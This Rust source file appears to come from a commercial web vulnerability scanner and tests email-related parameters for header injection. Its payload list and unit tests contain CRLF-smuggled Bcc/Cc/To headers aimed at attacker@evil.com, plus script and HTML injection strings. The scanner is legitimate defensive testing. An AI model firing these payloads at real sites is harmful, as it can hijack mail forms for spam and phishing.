// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Bountyy Oy - Email Header Injection Scanner
 * Tests for email header injection vulnerabilities (CRLF injection in email contexts)
 *
 * Detects:
 * - BCC/CC/To header injection
 * - Email subject injection
 * - Email body injection via Content-Type
 * - CRLF injection in email-related parameters
 * - Header injection leading to spam/phishing attacks
 *
 * @copyright 2026 Bountyy Oy
 * @license Proprietary
 */

use crate::http_client::HttpClient;
use crate::scanners::parameter_filter::{ParameterFilter, ScannerType};
use crate::types::{Confidence, ScanConfig, Severity, Vulnerability};
use std::sync::Arc;
use tracing::{debug, info};

pub struct EmailHeaderInjectionScanner {
    http_client: Arc<HttpClient>,
}

impl EmailHeaderInjectionScanner {
    pub fn new(http_client: Arc<HttpClient>) -> Self {
        Self { http_client }
    }

    /// Scan a parameter for email header injection vulnerabilities
    pub async fn scan_parameter(
        &self,
        url: &str,
        param_name: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        // License check
        if !crate::license::verify_scan_authorized() {
            return Err(anyhow::anyhow!("Scan not authorized. Please check your license."));
        }

        // Smart parameter filtering - skip framework internals
        if ParameterFilter::should_skip_parameter(param_name, ScannerType::Other) {
            debug!("[Email] Skipping framework/internal parameter: {}", param_name);
            return Ok((Vec::new(), 0));
        }

        let mut vulnerabilities = Vec::new();
        let mut tests_run = 0;

        info!("[Email] Testing email header injection on parameter: {} (priority: {})",
              param_name,
              ParameterFilter::get_parameter_priority(param_name));

        // Get baseline response with normal email
        let baseline_value = "test@example.com";
        let baseline_url = if url.contains('?') {
            format!("{}&{}={}", url, param_name, baseline_value)
        } else {
            format!("{}?{}={}", url, param_name, baseline_value)
        };

        let baseline_response = match self.http_client.get(&baseline_url).await {
            Ok(resp) => Some(resp),
            Err(e) => {
                debug!("Baseline request failed: {}", e);
                None
            }
        };

        // Test various email header injection payloads
        let payloads = vec![
            // BCC injection (URL encoded)
            ("test@example.com%0d%0aBcc:attacker@evil.com", "BCC header injection (URL encoded)"),
            ("test@example.com%0aBcc:attacker@evil.com", "BCC header injection (LF only)"),
            ("test@example.com\r\nBcc:attacker@evil.com", "BCC header injection (literal CRLF)"),

            // CC injection
            ("test@example.com%0d%0aCc:attacker@evil.com", "CC header injection (URL encoded)"),
            ("test@example.com%0aCc:attacker@evil.com", "CC header injection (LF only)"),
            ("test@example.com\r\nCc:attacker@evil.com", "CC header injection (literal CRLF)"),

            // To header injection
            ("test@example.com%0d%0aTo:attacker@evil.com", "To header injection (URL encoded)"),
            ("test@example.com%0aTo:attacker@evil.com", "To header injection (LF only)"),
            ("test@example.com\r\nTo:attacker@evil.com", "To header injection (literal CRLF)"),

            // Subject injection
            ("test@example.com%0d%0aSubject:Injected Subject", "Subject header injection"),
            ("test@example.com%0aSubject:Spam%20Message", "Subject injection (LF)"),

            // Reply-To injection
            ("test@example.com%0d%0aReply-To:attacker@evil.com", "Reply-To header injection"),

            // From header injection
            ("test@example.com%0d%0aFrom:attacker@evil.com", "From header injection"),

            // Content-Type injection (email body manipulation)
            ("test@example.com%0d%0aContent-Type:text/html", "Content-Type header injection"),
            ("test@example.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
             "Content-Type with XSS payload"),
            ("test@example.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Injected HTML</h1>",
             "Content-Type with HTML injection"),

            // Multiple headers
            ("test@example.com%0d%0aBcc:attacker@evil.com%0d%0aSubject:Injected",
             "Multiple header injection (BCC + Subject)"),
            ("test@example.com%0aBcc:attacker@evil.com%0aCc:spam@evil.com",
             "Multiple recipient injection"),

            // Double encoding attempts
            ("test@example.com%250d%250aBcc:attacker@evil.com", "BCC injection (double encoded)"),

            // Unicode variants
            ("test@example.com%E5%98%8A%E5%98%8DBcc:attacker@evil.com", "BCC injection (Unicode CRLF)"),

            // Null byte variants
            ("test@example.com%00%0d%0aBcc:attacker@evil.com", "BCC injection (null byte + CRLF)"),

            // Body injection via double CRLF
            ("test@example.com%0d%0a%0d%0aInjected email body content", "Email body injection"),
        ];

        for (payload, description) in payloads {
            tests_run += 1;

            let test_url = if url.contains('?') {
                format!("{}&{}={}", url, param_name, payload)
            } else {
                format!("{}?{}={}", url, param_name, payload)
            };

            match self.http_client.get(&test_url).await {
                Ok(response) => {
                    // Convert HashMap headers to Vec of tuples
                    let headers_vec: Vec<(String, String)> = response.headers
                        .iter()
                        .map(|(k, v)| (k.clone(), v.clone()))
                        .collect();
                    if let Some(vuln) = self.analyze_response(
                        &response.body,
                        &headers_vec,
                        baseline_response.as_ref(),
                        payload,
                        description,
                        &test_url,
                        param_name,
                    ) {
                        info!("Email header injection vulnerability detected: {}", description);
                        vulnerabilities.push(vuln);
                        break; // Found vulnerability, move to next parameter
                    }
                }
                Err(e) => {
                    debug!("Request failed: {}", e);
                }
            }
        }

        Ok((vulnerabilities, tests_run))
    }

    /// Scan endpoint for email header injection (general scan)
    ///
    /// IMPORTANT: This scan ONLY runs when there's evidence of email functionality.
    /// It will NOT blindly test invented parameters on arbitrary sites.
    pub async fn scan(
        &self,
        url: &str,
        _config: &ScanConfig,
    ) -> anyhow::Result<(Vec<Vulnerability>, usize)> {
        // License check
        if !crate::license::verify_scan_authorized() {
            return Err(anyhow::anyhow!("Scan not authorized. Please check your license."));
        }

        // First, check if this site has email functionality by fetching the page
        // and looking for contact forms or email-related endpoints
        let has_email_functionality = match self.http_client.get(url).await {
            Ok(response) => {
                let body_lower = response.body.to_lowercase();

                // Check for evidence of email functionality
                let has_contact_form = body_lower.contains("contact") &&
                    (body_lower.contains("<form") || body_lower.contains("action="));
                let has_email_form = body_lower.contains("email") &&
                    body_lower.contains("<form") &&
                    (body_lower.contains("type=\"email\"") || body_lower.contains("type='email'"));
                let has_mail_endpoint = body_lower.contains("/mail") ||
                    body_lower.contains("/contact") ||
                    body_lower.contains("/send") ||
                    body_lower.contains("/subscribe") ||
                    body_lower.contains("mailto:");
                let has_smtp_hints = body_lower.contains("smtp") ||
                    body_lower.contains("sendmail") ||
                    body_lower.contains("phpmailer");

                has_contact_form || has_email_form || has_mail_endpoint || has_smtp_hints
            }
            Err(_) => false,
        };

        // If no email functionality detected, skip this scanner entirely
        // This prevents false positives on static sites, SPAs without email features, etc.
        if !has_email_functionality {
            debug!("No email functionality detected on {}, skipping email header injection scan", url);
            return Ok((Vec::new(), 1)); // 1 test = the initial check
        }

        info!("Email functionality detected, proceeding with email header injection scan");

        let mut all_vulnerabilities = Vec::new();
        let mut total_tests = 1; // Count the initial check

        // Only test email-related parameter names if we confirmed email functionality exists
        let email_params = vec![
            "email".to_string(),
            "to".to_string(),
            "from".to_string(),
            "subject".to_string(),
            "message".to_string(),
            "contact".to_string(),
            "reply".to_string(),
            "replyto".to_string(),
            "reply_to".to_string(),
            "mail".to_string(),
            "recipient".to_string(),
            "sender".to_string(),
        ];

        for param in email_params {
            let (vulns, tests) = self.scan_parameter(url, &param, _config).await?;
            all_vulnerabilities.extend(vulns);
            total_tests += tests;

            // If we found a vulnerability, we can stop testing
            if !all_vulnerabilities.is_empty() {
                break;
            }
        }

        Ok((all_vulnerabilities, total_tests))
    }

    /// Analyze response for email header injection indicators
    fn analyze_response(
        &self,
        body: &str,
        headers: &[(String, String)],
        baseline_response: Option<&crate::http_client::HttpResponse>,
        payload: &str,
        _description: &str,
        url: &str,
        param_name: &str,
    ) -> Option<Vulnerability> {
        let body_lower = body.to_lowercase();

        // Check for error messages that indicate email header processing
        let error_indicators = vec![
            "header",
            "injection",
            "invalid email",
            "invalid header",
            "mail header",
            "email header",
            "invalid recipient",
            "invalid sender",
            "malformed",
        ];

        for indicator in &error_indicators {
            if body_lower.contains(indicator) && (body_lower.contains("error") || body_lower.contains("invalid")) {
                // Compare with baseline to see if this is a different error
                if let Some(baseline) = baseline_response {
                    if !baseline.body.to_lowercase().contains(indicator) {
                        return Some(self.create_vulnerability(
                            url,
                            param_name,
                            payload,
                            "Email header injection - Error message indicates header processing",
                            &format!("Response contains error message with '{}', suggesting email header injection was processed", indicator),
                            Confidence::Medium,
                        ));
                    }
                }
            }
        }

        // Check for success messages that might indicate email was sent
        let success_indicators = vec![
            "email sent",
            "message sent",
            "sent successfully",
            "delivered",
            "thank you",
            "confirmation",
            "your message has been sent",
        ];

        // If payload contains header injection and we see success message -> likely vulnerable
        if payload.contains("Bcc:") || payload.contains("Cc:") || payload.contains("To:") {
            for indicator in &success_indicators {
                if body_lower.contains(indicator) {
                    // Check if baseline also has success message (to reduce false positives)
                    let baseline_has_success = if let Some(baseline) = baseline_response {
                        baseline.body.to_lowercase().contains(indicator)
                    } else {
                        false
                    };

                    // If baseline also succeeds, we need stronger evidence
                    // Look for different response size or additional indicators
                    if !baseline_has_success {
                        return Some(self.create_vulnerability(
                            url,
                            param_name,
                            payload,
                            "Email header injection - Success message with header injection payload",
                            &format!("Email appears to be sent successfully with injected headers. Response: '{}'", indicator),
                            Confidence::High,
                        ));
                    } else if let Some(baseline) = baseline_response {
                        // Check if response differs significantly from baseline
                        let size_diff = (body.len() as i64 - baseline.body.len() as i64).abs();
                        if size_diff > 50 { // Significant size difference
                            return Some(self.create_vulnerability(
                                url,
                                param_name,
                                payload,
                                "Email header injection - Response differs from baseline",
                                &format!("Response size differs by {} bytes when header injection is attempted", size_diff),
                                Confidence::Medium,
                            ));
                        }
                    }
                }
            }
        }

        // Check for reflected CRLF characters in response
        if payload.contains("%0d%0a") || payload.contains("\r\n") || payload.contains("%0a") {
            // Look for literal CRLF in body
            if body.contains("\r\n") && body.contains("Bcc:")
                || body.contains("\r\n") && body.contains("Cc:")
                || body.contains("\r\n") && body.contains("Subject:") {
                return Some(self.create_vulnerability(
                    url,
                    param_name,
                    payload,
                    "Email header injection - CRLF with email headers reflected",
                    "CRLF characters with email headers (Bcc/Cc/Subject) found in response",
                    Confidence::High,
                ));
            }
        }

        // Check for injected email addresses in response
        if payload.contains("attacker@evil.com") && body.contains("attacker@evil.com") {
            // Check if this wasn't in baseline
            let in_baseline = if let Some(baseline) = baseline_response {
                baseline.body.contains("attacker@evil.com")
            } else {
                false
            };

            if !in_baseline {
                return Some(self.create_vulnerability(
                    url,
                    param_name,
                    payload,
                    "Email header injection - Injected email address reflected",
                    "Injected email address 'attacker@evil.com' appears in response",
                    Confidence::Medium,
                ));
            }
        }

        // Check for Content-Type injection with HTML/script content
        // IMPORTANT: Only flag if our EXACT injected script appears, not just any <script> tag
        // Normal websites have <script> tags - that's not a vulnerability!
        if payload.contains("<script>alert(1)</script>") && body.contains("<script>alert(1)</script>") {
            // Also verify that the payload was actually processed (not just in a static page)
            // Check if this is NOT a normal HTML page that would already have scripts
            if !body.contains("<!DOCTYPE") && !body.contains("<html") {
                return Some(self.create_vulnerability(
                    url,
                    param_name,
                    payload,
                    "Email header injection with XSS",
                    "Email header injection allows script injection via Content-Type header",
                    Confidence::High,
                ));
            }
        }

        // Check for HTML injection via Content-Type
        if payload.contains("<h1>") && body.contains("<h1>Injected HTML</h1>") {
            return Some(self.create_vulnerability(
                url,
                param_name,
                payload,
                "Email header injection with HTML injection",
                "Email header injection allows HTML content injection via Content-Type header",
                Confidence::High,
            ));
        }

        // Check response headers for any reflection
        for (key, value) in headers {
            let key_lower = key.to_lowercase();
            let value_lower = value.to_lowercase();

            // Check if email-related headers were set
            if (key_lower == "x-mailer" || key_lower.contains("mail") || key_lower.contains("smtp"))
                && (value_lower.contains("bcc") || value_lower.contains("attacker")) {
                return Some(self.create_vulnerability(
                    url,
                    param_name,
                    payload,
                    "Email header injection - Mail-related response headers",
                    &format!("Suspicious mail-related header detected: {}: {}", key, value),
                    Confidence::Medium,
                ));
            }
        }

        None
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        url: &str,
        param_name: &str,
        payload: &str,
        description: &str,
        evidence: &str,
        confidence: Confidence,
    ) -> Vulnerability {
        let verified = matches!(confidence, Confidence::High);

        Vulnerability {
            id: format!("email_header_injection_{}", uuid::Uuid::new_v4()),
            vuln_type: "Email Header Injection".to_string(),
            severity: Severity::Medium,
            confidence,
            category: "Injection".to_string(),
            url: url.to_string(),
            parameter: Some(param_name.to_string()),
            payload: payload.to_string(),
            description: format!(
                "Email header injection vulnerability in parameter '{}': {}",
                param_name, description
            ),
            evidence: Some(evidence.to_string()),
            cwe: "CWE-93".to_string(),
            cvss: 6.1,
            verified,
            false_positive: false,
            remediation: "1. Sanitize all CRLF characters (\\r\\n, %0d%0a, %0a, %0d) from email-related input\n\
                         2. Validate email addresses using strict RFC-compliant regex patterns\n\
                         3. Use email library functions that automatically escape headers\n\
                         4. Reject input containing newline characters in email headers\n\
                         5. Implement allowlists for email header values\n\
                         6. Use parameterized email sending functions\n\
                         7. Consider using a dedicated email service (SendGrid, AWS SES) with built-in protections\n\
                         8. Log and monitor for email header injection attempts".to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::http_client::HttpClient;
    use std::sync::Arc;

    fn create_test_scanner() -> EmailHeaderInjectionScanner {
        let http_client = Arc::new(HttpClient::new(30, 3).unwrap());
        EmailHeaderInjectionScanner::new(http_client)
    }

    #[test]
    fn test_analyze_error_message() {
        let scanner = create_test_scanner();

        let body = "Error: Invalid email header detected";
        let headers = vec![];

        let result = scanner.analyze_response(
            body,
            &headers,
            None,
            "test@example.com%0d%0aBcc:attacker@evil.com",
            "BCC injection",
            "http://example.com",
            "email",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert_eq!(vuln.vuln_type, "Email Header Injection");
        assert_eq!(vuln.severity, Severity::Medium);
        assert_eq!(vuln.cwe, "CWE-93");
        assert_eq!(vuln.cvss, 6.1);
    }

    #[test]
    fn test_analyze_success_message() {
        let scanner = create_test_scanner();

        let body = "Thank you! Your email has been sent successfully.";
        let headers = vec![];

        let result = scanner.analyze_response(
            body,
            &headers,
            None,
            "test@example.com%0d%0aBcc:attacker@evil.com",
            "BCC injection",
            "http://example.com",
            "email",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert_eq!(vuln.confidence, Confidence::High);
    }

    #[test]
    fn test_analyze_reflected_crlf() {
        let scanner = create_test_scanner();

        let body = "Processing email to:\r\nBcc:attacker@evil.com";
        let headers = vec![];

        let result = scanner.analyze_response(
            body,
            &headers,
            None,
            "test@example.com%0d%0aBcc:attacker@evil.com",
            "BCC injection",
            "http://example.com",
            "email",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert!(vuln.description.contains("CRLF"));
    }

    #[test]
    fn test_analyze_xss_via_content_type() {
        let scanner = create_test_scanner();

        let body = "<script>alert(1)</script>";
        let headers = vec![];

        let result = scanner.analyze_response(
            body,
            &headers,
            None,
            "test@example.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
            "Content-Type with XSS",
            "http://example.com",
            "email",
        );

        assert!(result.is_some());
        let vuln = result.unwrap();
        assert!(vuln.description.contains("XSS"));
    }

    #[test]
    fn test_analyze_safe_response() {
        let scanner = create_test_scanner();

        let body = "Normal email form page";
        let headers = vec![
            ("Content-Type".to_string(), "text/html".to_string()),
        ];

        let result = scanner.analyze_response(
            body,
            &headers,
            None,
            "test@example.com",
            "Normal email",
            "http://example.com",
            "email",
        );

        assert!(result.is_none());
    }

    #[test]
    fn test_create_vulnerability() {
        let scanner = create_test_scanner();

        let vuln = scanner.create_vulnerability(
            "http://example.com/contact",
            "email",
            "test@example.com%0d%0aBcc:attacker@evil.com",
            "Email header injection - BCC injection",
            "Injected BCC header detected in response",
            Confidence::High,
        );

        assert_eq!(vuln.vuln_type, "Email Header Injection");
        assert_eq!(vuln.severity, Severity::Medium);
        assert_eq!(vuln.parameter, Some("email".to_string()));
        assert_eq!(vuln.cwe, "CWE-93");
        assert_eq!(vuln.cvss, 6.1);
        assert!(vuln.verified);
        assert!(vuln.remediation.contains("CRLF"));
    }
}
